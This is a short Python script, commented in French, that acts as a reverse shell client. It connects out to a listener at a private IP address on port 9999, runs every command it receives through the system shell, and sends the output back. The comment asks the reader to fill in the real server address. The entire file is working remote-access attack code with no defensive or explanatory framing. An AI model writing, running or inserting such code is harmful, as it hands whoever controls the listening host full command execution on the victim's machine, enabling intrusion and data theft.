import socket
import subprocess

host = '192.168.0.131'  # <-- Remplace par l'adresse IP réelle du serveur
port = 9999

client = socket.socket()
client.connect((host, port))

while True:
    cmd = client.recv(1024).decode()
    if cmd.lower() in ['exit', 'quit']:
        break
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    client.send(output)

client.close()

